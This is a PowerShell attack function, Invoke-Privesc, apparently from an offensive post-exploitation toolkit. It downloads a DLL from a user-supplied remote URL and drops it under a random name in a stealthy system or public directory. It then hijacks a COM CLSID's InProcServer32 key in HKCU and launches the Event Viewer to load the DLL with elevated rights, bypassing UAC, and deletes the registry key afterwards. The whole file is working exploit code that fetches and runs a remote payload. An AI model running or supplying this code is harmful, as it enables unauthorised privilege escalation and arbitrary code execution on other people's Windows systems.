function Invoke-Privesc {
[CmdletBinding()]
param (
	[Switch]$Help,
	[Switch]$List,
	[Switch]$UacBypass,
	[String]$RemoteDll
)
	
$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 13 | foreach {[char]$_}))

$DataDirs = @(
	("C:\ProgramData\Intel"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys"),
	("C:\ProgramData\Microsoft\Crypto\SystemKeys"),
	("C:\ProgramData\Microsoft\Diagnosis"),
	("C:\ProgramData\Microsoft\Diagnosis\FeedbackHub"),
	("C:\ProgramData\Microsoft\Diagnosis\Scripts"),
	("C:\ProgramData\Microsoft\Network\Downloader"),
	("C:\ProgramData\Microsoft\Office\Heartbeat"),
	("C:\ProgramData\Microsoft\Search\Data"),
	("C:\ProgramData\Microsoft\Search\Data\Applications"),
	("C:\ProgramData\Microsoft\Search\Data\Temp"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportArchive"),
	("C:\ProgramData\Microsoft\Windows\WER\ReportQueue"),
	("C:\ProgramData\Microsoft\Windows\WER\Temp"),
	("C:\ProgramData\WindowsHolographicDevices"),
	("C:\Users\Public\Libraries"),
	("C:\Users\Public\AccountPictures"),
	("C:\Users\Public\Documents"),
	("C:\Users\Public\Downloads"),
	("C:\Users\Public\Music"),
	("C:\Users\Public\Pictures"),
	("C:\Users\Public\Videos"),
	("C:\Users\Public\Roaming"),
	("C:\Windows\debug\WIA"),
	("C:\Windows\ServiceProfiles\LocalService"),
	("C:\Windows\ServiceProfiles\LocalService\AppData"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\Local"),
	("C:\Windows\ServiceProfiles\LocalService\AppData\LocalLow"),
	("C:\Windows\Temp"),
	("C:\windows\system32\config"),
	("C:\Windows\System32\LogFiles\WMI"),
	("C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys")
)

# create a new array from the list above of whose existence is true on the target system.
$NewArray = foreach ($datadir in $datadirs) {
	if (Test-Path $datadir) {
	@($datadir)
	}
}
$datadir = ($newarray[(get-random -Maximum ([array]$newarray).count)])
	
	if ($Help -eq $True) {
		
		Write @"
	
 ### Invoke-Privesc HELP ###
 ---------------------------
 
 Invoke-Privesc [-command] [-parameter(s)]
 
 Available Invoke-Privesc Commands:
 ----------------------------------
 /-----------------------------------------------------------------------------/
 | -UacBypass [-RemoteDll] remote_dll                                          |
 | --------------------------------------------------------------------------- |
 |                                                                             |
 |  [?] Description: Downloads a remotely hosted DLL payload                   |
 |      and executes a UAC bypass using CLSID                                  |
 |      0A29FF9E-7F9C-4437-8B11-F424491E3931 "InProcServer"                    |
 |      Event Viewer (mmc.exe) Method. Requires Admin User with UAC            |
 |      set to "Default". (Win 10.0.16299)                                     |
 |                                                                             |
 |  [?] Usage: Invoke-Privesc -UacBypass -RemoteDll https://srv/file.dll       |
 /-----------------------------------------------------------------------------/

"@
	}
	elseif ($List -eq $True) {
		Write @"
		
 Invoke-Privesc Command List:
 ----------------------------
 Invoke-Privesc -UacBypass [-RemoteDll] remote_dll 
 
"@
	}
	
	elseif ($UacBypass -and $RemoteDll) {
	# https://twitter.com/UnaPibaGeek/status/1067777096955674625

		$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
	
		$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
	
		if ($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1) {
			Write " [!] UAC is set to 'Always Notify', Can't bypass with this settings. Requires 'Default' UAC setting."
			Return
		}
		else {
		
			$ClsidRegPath = "HKCU:\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32"
			$ValName = "(Default)"
			$LocalDll = "$DataDir\$rs1.dll"
		
			(New-Object System.Net.Webclient).downloadfile("$RemoteDll", "$LocalDll")
		
			$RegValue = $LocalDll
			New-Item -Path $ClsidRegPath -Force | Out-Null
			New-ItemProperty -Path $ClsidRegPath -Name $ValName -Value $RegValue | Out-Null
		
			$Command = "$env:windir\system32\eventvwr.msc /s"
			Invoke-Expression $Command
		
			Sleep 11
			Remove-Item -Path $ClsidRegPath -Force -ErrorAction SilentlyContinue | Out-Null
		}
	}
}
